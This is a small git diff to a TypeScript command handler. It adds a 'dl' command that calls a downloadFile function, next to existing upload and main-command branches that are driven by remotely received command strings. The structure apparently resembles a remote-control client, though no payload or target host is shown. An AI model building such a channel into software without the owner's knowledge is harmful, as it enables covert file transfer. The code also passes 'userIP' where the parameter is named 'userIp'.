@@ -1,5 +1,6 @@
 import { createSendData } from "../functions/createSendData"
 import { client } from "./clientMain"
+import { downloadFile } from "./download"
 import { getMainCommand } from "./getFun"
 import { uploadFile } from "./uploadFile"
 
@@ -25,6 +26,8 @@ export const checkCmdMain = (userIp:string,cmd:string)=>{
         if(getCmd.length>2){
             uploadFile(getCmd[1],getCmd[2])
         }
+    }else if(getCmd[0] == "dl"){
+        downloadFile(getCmd[1])
     }else{
         console.log("No Command")
         getMainCommand(userIP)
